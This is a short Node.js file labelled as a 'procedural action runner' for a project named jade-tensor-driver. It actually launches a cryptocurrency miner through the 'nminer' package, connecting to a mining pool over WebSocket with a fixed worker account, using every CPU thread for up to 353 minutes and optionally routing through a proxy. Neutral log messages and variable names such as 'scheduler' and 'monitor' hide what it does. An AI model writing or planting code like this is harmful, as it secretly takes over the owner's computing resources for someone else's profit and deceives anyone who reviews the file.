// Procedural action runner for jade-tensor-driver
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

async function startRuntime() {
    const runId = "4fd301";
    console.log(`[monitor] Starting runtime for ${config.appName || "jade-tensor-driver"} [${runId}]`);

    const scheduler = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Subhas1975.saloon",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const tick = () => { setTimeout(tick, 48000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (353m) reached, exiting cleanly.");
        process.exit(0);
    }, 353 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${runId}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

startRuntime().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
